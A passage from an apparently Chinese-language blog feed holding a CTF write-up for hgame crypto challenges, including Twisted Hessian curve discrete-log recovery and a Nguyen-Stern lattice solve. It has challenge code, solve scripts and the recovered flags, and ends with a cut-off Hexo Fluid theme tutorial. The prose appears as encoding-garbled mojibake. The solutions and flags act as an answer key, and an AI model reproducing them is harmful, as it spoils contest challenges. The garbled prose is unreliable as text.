reverse_Fortune_wheel(YOUR_final_Value)<br><span class="hljs-built_in">print</span>(YOUR_final_Value)<br>YOUR_initial_FATE=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> YOUR_final_Value:<br>    <span class="hljs-keyword">if</span> i&lt;<span class="hljs-number">0</span>:<br>        YOUR_initial_FATE.append(<span class="hljs-string">&#x27;re-&#x27;</span>+tarot[i^-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">else</span>:<br>       YOUR_initial_FATE.append(tarot[i])<br>FLAG=(<span class="hljs-string">&quot;hgame&#123;&quot;</span>+<span class="hljs-string">&quot;&amp;&quot;</span>.join(YOUR_initial_FATE)+<span class="hljs-string">&quot;&#125;&quot;</span>).replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;_&quot;</span>)<br><span class="hljs-built_in">print</span>(FLAG)<br><span class="hljs-comment">#hgame&#123;re-The_Moon&amp;re-The_Sun&amp;Judgement&amp;re-Temperance&amp;Six_of_Cups&#125;</span><br><br></code></pre></td></tr></table></figure><h2 id="intergalactic-bound"><a class="markdownIt-Anchor" href="#intergalactic-bound"></a> Intergalactic Bound</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> flag<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_THCurve</span>(<span class="hljs-params">P, Q</span>):<br>    <span class="hljs-keyword">if</span> P == (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>):<br>        <span class="hljs-keyword">return</span> Q<br>    <span class="hljs-keyword">if</span> Q == (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>):<br>        <span class="hljs-keyword">return</span> P<br>    x1, y1 = P<br>    x2, y2 = Q<br>    x3 = (x1 - y1 ** <span class="hljs-number">2</span> * x2 * y2) * <span class="hljs-built_in">pow</span>(a * x1 * y1 * x2 ** <span class="hljs-number">2</span> - y2, -<span class="hljs-number">1</span>, p) % p<br>    y3 = (y1 * y2 ** <span class="hljs-number">2</span> - a * x1 ** <span class="hljs-number">2</span> * x2) * <span class="hljs-built_in">pow</span>(a * x1 * y1 * x2 ** <span class="hljs-number">2</span> - y2, -<span class="hljs-number">1</span>, p) % p<br>    <span class="hljs-keyword">return</span> x3, y3<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul_THCurve</span>(<span class="hljs-params">n, P</span>):<br>    R = (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">while</span> n &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">if</span> n % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:<br>            R = add_THCurve(R, P)<br>        P = add_THCurve(P, P)<br>        n = n // <span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> R<br><br><br>p = getPrime(<span class="hljs-number">96</span>)<br>a = randint(<span class="hljs-number">1</span>, p)<br>G = (randint(<span class="hljs-number">1</span>,p), randint(<span class="hljs-number">1</span>,p))<br>d = (a*G[<span class="hljs-number">0</span>]^<span class="hljs-number">3</span>+G[<span class="hljs-number">1</span>]^<span class="hljs-number">3</span>+<span class="hljs-number">1</span>)%p*inverse(G[<span class="hljs-number">0</span>]*G[<span class="hljs-number">1</span>],p)%p<br>x = randint(<span class="hljs-number">1</span>, p)<br>Q = mul_THCurve(x, G)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;p = <span class="hljs-subst">&#123;p&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;G = <span class="hljs-subst">&#123;G&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Q = <span class="hljs-subst">&#123;Q&#125;</span>&quot;</span>)<br><br>key = hashlib.sha256(<span class="hljs-built_in">str</span>(x).encode()).digest()<br>cipher = AES.new(key, AES.MODE_ECB)<br>flag = pad(flag,<span class="hljs-number">16</span>)<br>ciphertext = cipher.encrypt(flag)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ciphertext=<span class="hljs-subst">&#123;ciphertext&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>Twisted Hessianæ›²çº¿ï¼š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>âˆ—</mo><msup><mi>x</mi><mn>3</mn></msup><mo>âˆ—</mo><mo>+</mo><msup><mi>y</mi><mn>3</mn></msup><mo>+</mo><mn>1</mn><mo>=</mo><mi>d</mi><mo>âˆ—</mo><mi>x</mi><mo>âˆ—</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">a*x^3*+y^3+1=d*x*y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord">+</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></p><p>ä½†ä¸çŸ¥é“å‚æ•°aå’Œd</p><p>ä½†æ˜¯é€šè¿‡ä¸¤ä¸ªç‚¹ï¼Œå¯ä»¥è”ç«‹ä¸¤ä¸ªæ–¹ç¨‹è¿›è¡Œæ±‚è§£</p><p>ä¹‹åå°†è¯¥æ›²çº¿æ˜ å°„åˆ°ECCä¸Šæ±‚è§£</p><p>é€šè¿‡2024ç¾ŠåŸæ¯ï¼Œå¯ä»¥çŸ¥é“åˆ©ç”¨sageä¸­çš„EllipticCurve_from_cubicï¼Œå¯ä»¥ç›´æ¥åšæ˜ å°„</p><blockquote><p>å‚è€ƒ2024ç¾ŠåŸæ¯ï¼š<a href="https://tangcuxiaojikuai.xyz/post/689431.html">tangcuxiaojikuai.xyz/post/689431.html</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python">p = <span class="hljs-number">55099055368053948610276786301</span><br>G = (<span class="hljs-number">19663446762962927633037926740</span>, <span class="hljs-number">35074412430915656071777015320</span>)<br>Q = (<span class="hljs-number">26805137673536635825884330180</span>, <span class="hljs-number">26376833112609309475951186883</span>)<br>ciphertext=<span class="hljs-string">b&quot;k\xe8\xbe\x94\x9e\xfc\xe2\x9e\x97\xe5\xf3\x04&#x27;\x8f\xb2\x01T\x06\x88\x04\xeb3Jl\xdd Pk$\x00:\xf5&quot;</span><br><br><span class="hljs-comment"># å®šä¹‰æœ‰é™åŸŸ</span><br>F = GF(p)<br><br><span class="hljs-comment"># å®šä¹‰å¤šé¡¹å¼ç¯ï¼Œa å’Œ d ä½œä¸ºæœªçŸ¥é‡</span><br>R.&lt;a, d&gt; = PolynomialRing(F)<br><br><span class="hljs-comment"># è½¬æ¢åˆ°æœ‰é™åŸŸ</span><br>G0, G1 = F(G[<span class="hljs-number">0</span>]), F(G[<span class="hljs-number">1</span>])<br>Q0, Q1 = F(Q[<span class="hljs-number">0</span>]), F(Q[<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># å®šä¹‰æ–¹ç¨‹</span><br>eq1 = d * G0 * G1 - (a * G0^<span class="hljs-number">3</span> + G1^<span class="hljs-number">3</span> + <span class="hljs-number">1</span>)<br>eq2 = d * Q0 * Q1 - (a * Q0^<span class="hljs-number">3</span> + Q1^<span class="hljs-number">3</span> + <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># æ±‚è§£</span><br>solutions = R.ideal(eq1, eq2).variety()<br><br>a=<span class="hljs-built_in">int</span>(solutions[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;a&quot;</span>])<br>d=<span class="hljs-built_in">int</span>(solutions[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;d&quot;</span>])<br>d = (a*G[<span class="hljs-number">0</span>]^<span class="hljs-number">3</span>+G[<span class="hljs-number">1</span>]^<span class="hljs-number">3</span>+<span class="hljs-number">1</span>)%p*inverse_mod(G[<span class="hljs-number">0</span>]*G[<span class="hljs-number">1</span>],p)%p<br><br>R.&lt;x,y,z&gt; = Zmod(p)[]<br>cubic = a*x^<span class="hljs-number">3</span> + y^<span class="hljs-number">3</span> + z^<span class="hljs-number">3</span> - d*x*y*z<br>E = EllipticCurve_from_cubic(cubic,morphism=<span class="hljs-literal">True</span>)<br>G = E(G)<br>Q = E(Q)<br>x = (Q).log(G)<br>x = <span class="hljs-built_in">int</span>(x)<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br>key = hashlib.sha256(<span class="hljs-built_in">str</span>(x).encode()).digest()<br>cipher = AES.new(key, AES.MODE_ECB)<br>flag = cipher.decrypt(ciphertext)<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#b&#x27;hgame&#123;N0th1ng_bu7_up_Up_UP!&#125;\x04\x04\x04\x04</span><br></code></pre></td></tr></table></figure><h2 id="spica"><a class="markdownIt-Anchor" href="#spica"></a> SPiCa</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime, long_to_bytes,bytes_to_long<br><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">derive_M</span>(<span class="hljs-params">n</span>):<br>    iota=<span class="hljs-number">0.035</span><br>    Mbits=<span class="hljs-built_in">int</span>(<span class="hljs-number">2</span> * iota * n^<span class="hljs-number">2</span> + n * log(n,<span class="hljs-number">2</span>))<br>    M = random_prime(<span class="hljs-number">2</span>^Mbits, proof = <span class="hljs-literal">False</span>, lbound = <span class="hljs-number">2</span>^(Mbits - <span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">return</span> Integer(M)<br><br>m = bytes_to_long(flag).bit_length()<br>n = <span class="hljs-number">70</span><br>p = derive_M(n)<br><br><br>F = GF(p)<br>x = random_matrix(F, <span class="hljs-number">1</span>, n)<br>A = random_matrix(ZZ, n, m, x=<span class="hljs-number">0</span>, y=<span class="hljs-number">2</span>)<br>A[randint(<span class="hljs-number">0</span>, n-<span class="hljs-number">1</span>)] = vector(ZZ, <span class="hljs-built_in">list</span>(<span class="hljs-built_in">bin</span>(bytes_to_long(flag))[<span class="hljs-number">2</span>:]))<br>h = x*A<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(<span class="hljs-built_in">str</span>(m) + <span class="hljs-string">&quot;\n&quot;</span>)<br>    file.write(<span class="hljs-built_in">str</span>(p) + <span class="hljs-string">&quot;\n&quot;</span>)<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> h:<br>        file.write(<span class="hljs-built_in">str</span>(item) + <span class="hljs-string">&quot;\n&quot;</span>)<br></code></pre></td></tr></table></figure><p>ç›´æ¥æŠ„å°±è¡Œäº†<a href="https://0xffff.one/d/2077">https://0xffff.one/d/2077</a></p><blockquote><p>å¯ä»¥å…ˆåˆ°åé¢æ”»å‡»éƒ¨åˆ†å¼€å§‹çœ‹ï¼Œä¼šç›´è§‚ä¸€ç‚¹</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">import</span> logging<br>logging.basicConfig(<br>    level=logging.DEBUG,<br>    <span class="hljs-built_in">format</span>=<span class="hljs-string">&quot;[%(levelname)s] %(message)s&quot;</span><br>)<br><br><span class="hljs-comment"># https://github.com/Neobeo/HackTM2023/blob/main/solve420.sage</span><br><span class="hljs-comment"># faster LLL reduction to replace `M.LLL()` wiith `flatter(M)`</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flatter</span>(<span class="hljs-params">M, **kwds</span>):<br>    <span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> check_output<br>    <span class="hljs-keyword">from</span> re <span class="hljs-keyword">import</span> findall<br>    M = matrix(ZZ,M)<br>    <span class="hljs-comment"># compile https://github.com/keeganryan/flatter and put it in [imath:0]PATH</span><br>    z = <span class="hljs-string">&#x27;[[&#x27;</span> + <span class="hljs-string">&#x27;]\n[&#x27;</span>.join(<span class="hljs-string">&#x27; &#x27;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>,row)) <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> M) + <span class="hljs-string">&#x27;]]&#x27;</span><br>    ret = check_output([<span class="hljs-string">&quot;flatter&quot;</span>], <span class="hljs-built_in">input</span>=z.encode())<br>    <span class="hljs-keyword">return</span> matrix(M.nrows(), M.ncols(), <span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>,findall(<span class="hljs-string">b&#x27;-?\\d+&#x27;</span>, ret)))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkMatrix</span>(<span class="hljs-params">M, wl=[-<span class="hljs-number">1</span>, <span class="hljs-number">1</span>]</span>):<br>  M = [<span class="hljs-built_in">list</span>(_) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(M)]<br>  ml = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(flatten(M)))<br>  logging.debug(ml)<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">sorted</span>(ml) == <span class="hljs-built_in">sorted</span>(wl)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Nguyen_Stern</span>(<span class="hljs-params">h, m, n, M</span>):<br>  B = matrix(ZZ, m)<br>  B[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>] = M<br>  h0i = Integer(h[<span class="hljs-number">0</span>]).inverse_mod(M)<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, m):<br>    B[i, <span class="hljs-number">0</span>] = - h[i] * h0i<br>    B[i, i] = <span class="hljs-number">1</span><br>  <span class="hljs-comment">#L = B.BKZ()# slooooooow</span><br>  L = flatter(B)<br>  logging.info(<span class="hljs-string">&#x27;flatter done.&#x27;</span>)<br><br>  <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  vh = vector(Zmod(M), h)</span><br><span class="hljs-string">  logging.debug([vector(Zmod(M), list(l)) * vh  for l in L])</span><br><span class="hljs-string">  &#x27;&#x27;&#x27;</span><br><br>  Lxo = matrix(ZZ, L[:m-n])<br>  Lxc = Lxo.right_kernel(algorithm=<span class="hljs-string">&#x27;pari&#x27;</span>).matrix() <span class="hljs-comment"># faster</span><br>  logging.info(<span class="hljs-string">&#x27;right_kernel done.&#x27;</span>)<br><br>  <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  try:</span><br><span class="hljs-string">    Lx_real = matrix(ZZ, [xi + [0] * (m - len(xi)) for xi in X])</span><br><span class="hljs-string">    rsc = Lxc.row_space()</span><br><span class="hljs-string">    logging.debug([xi in rsc for xi in Lx_real])</span><br><span class="hljs-string">  except:</span><br><span class="hljs-string">    pass</span><br><span class="hljs-string">  &#x27;&#x27;&#x27;</span><br><br>  e = matrix(ZZ, [<span class="hljs-number">1</span>] * m)<br>  B = block_matrix([[-e], [<span class="hljs-number">2</span>*Lxc]])<br>  Lx = B.BKZ()<br>  logging.info(<span class="hljs-string">&#x27;BKZ done.&#x27;</span>)<br>  <span class="hljs-keyword">assert</span> checkMatrix(Lx)<br>  <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">set</span>(Lx[<span class="hljs-number">0</span>])) == <span class="hljs-number">1</span><br><br>  Lx = Lx[<span class="hljs-number">1</span>:]<br>  E = matrix(ZZ, [[<span class="hljs-number">1</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Lxc.ncols())] <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Lxc.nrows())])<br>  Lx = (Lx + E) / <span class="hljs-number">2</span><br><br>  Lx2 = []<br>  e = vector(ZZ, [<span class="hljs-number">1</span>] * m)<br>  rsc = Lxc.row_space()<br>  <span class="hljs-keyword">for</span> lx <span class="hljs-keyword">in</span> Lx:<br>    <span class="hljs-keyword">if</span> lx <span class="hljs-keyword">in</span> rsc:<br>      Lx2 += [lx]<br>      <span class="hljs-keyword">continue</span><br>    lx = e - lx<br>    <span class="hljs-keyword">if</span> lx <span class="hljs-keyword">in</span> rsc:<br>      Lx2 += [lx]<br>      <span class="hljs-keyword">continue</span><br>    logging.warning(<span class="hljs-string">&#x27;Something wrong?&#x27;</span>)<br>  Lx = matrix(Zmod(M), Lx2)<br><br>  vh = vector(Zmod(M), h)<br>  va = Lx.solve_left(vh)<br>  <span class="hljs-keyword">return</span> Lx, va<br><br><br>m=<span class="hljs-number">247</span><br>n=<span class="hljs-number">70</span><br>M= <br>h=<br>Lx, va = Nguyen_Stern(h, m, n, M)<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Lx:<br>  flag=<span class="hljs-string">&#x27;&#x27;</span><br>  <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i:<br>    flag+=<span class="hljs-built_in">str</span>(j)<br>  flag=long_to_bytes(<span class="hljs-built_in">int</span>(flag,<span class="hljs-number">2</span>))<br>  <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;hgame&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>    <span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#hgame&#123;U_f0und_3he_5pec14l_0n3!&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hexo-fliudä¸»é¢˜å‹é“¾åˆ†ç±»</title>
    <link href="/2025/02/11/fluidlinks/"/>
    <url>/2025/02/11/fluidlinks/</url>
    
    <content type="html"><![CDATA[<p>éœ€æ±‚åœ¨å‹é“¾éƒ¨åˆ†è¿›è¡Œåˆ†ç±»å¤„ç†</p><p>åœ¨<code>_config.fluid.yml</code>ä¸­çš„<code>items</code>éƒ¨åˆ†å¯ä»¥å¤šå¡«ä¸€ä¸ªtitleä½œä¸ºåˆ†ç±»æ ‡é¢˜ï¼Œç„¶åå†åœ¨ä¸‹é¢æ·»åŠ å‹é“¾</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">-</span> title: &quot;YR&quot;<br>  links:<br><span class="hljs-bullet">    -</span> &#123;<br><span class="hljs-code">      title: &quot;xiaoy&quot;,</span><br><span class="hljs-code">      intro: &quot;(reverse)&quot;,</span><br><span class="hljs-code">      link: &quot;https://blog.csdn.net/xy_hzz&quot;,</span><br><span class="hljs-code">      avatar: &quot;https://profile-avatar.csdnimg.cn/1223b08551c049fd870cbe357ad5b0d0_xy_hzz.jpg!1&quot;</span><br><span class="hljs-code">    &#125;</span><br><span class="hljs-code">    </span><br><span class="hljs-code">- title: &quot;CTFer&quot;</span><br><span class="hljs-code">  links:</span><br><span class="hljs-code">    - &#123;</span><br><span class="hljs-code">      title: &quot;LilRan&quot;,</span><br><span class="hljs-code">      intro: &quot;ä»Šæ—¥å¯ç¨‹ æ— ç•å‘å‰&quot;,</span><br><span class="hljs-code">      link: &quot;https://blog.xinshi.fun/&quot;,</span><br><span class="hljs-code">      avatar: &quot;https://blog.xinshi.fun/assets/avatar.png&quot;</span><br><span class="hljs-code">    &#125;</span><br></code></pre></td></tr></table></figure><p>ä¿®æ”¹<code>node_modules\hexo-theme-fluid\layout\links.ejs</code></p><p>å°†row linkséƒ¨åˆ†ä¿®æ”¹ä¸ºå¦‚ä¸‹ï¼ˆæ„Ÿè°¢ChatGPTçš„ä»£ç è´¡çŒ®ï¼‰ï¼Œå°±å¯ä»¥äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;links&quot;</span>&gt;<br>  &lt;% <span class="hljs-keyword">for</span> (const group of theme.links.items || []) &#123; %&gt;<br>    &lt;% <span class="hljs-keyword">if</span> (group.title) &#123; %&gt;<br>      &lt;h2 <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;links-category-title&quot;</span>&gt;&lt;%- group.title %&gt;&lt;/h2&gt;<br>      &lt;% &#125; %&gt;<br>        &lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;row links-group&quot;</span>&gt;<br>          &lt;% <span class="hljs-keyword">for</span> (const each of group.links || []) &#123; %&gt;<br>            &lt;% <span class="hljs-keyword">if</span> (!each.title || !each.link) <span class="hljs-keyword">continue</span>; %&gt;<br>              &lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;card col-lg-4 col-md-6 col-sm-12&quot;</span>&gt;<br>                &lt;a href=<span class="hljs-string">&quot;&lt;%= url_for(each.link) %&gt;&quot;</span> <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;card-body hover-with-bg&quot;</span> target=<span class="hljs-string">&quot;_blank&quot;</span> rel=<span class="hljs-string">&quot;noopener&quot;</span>&gt;<br>                  &lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;card-content&quot;</span>&gt;<br>                    &lt;% <span 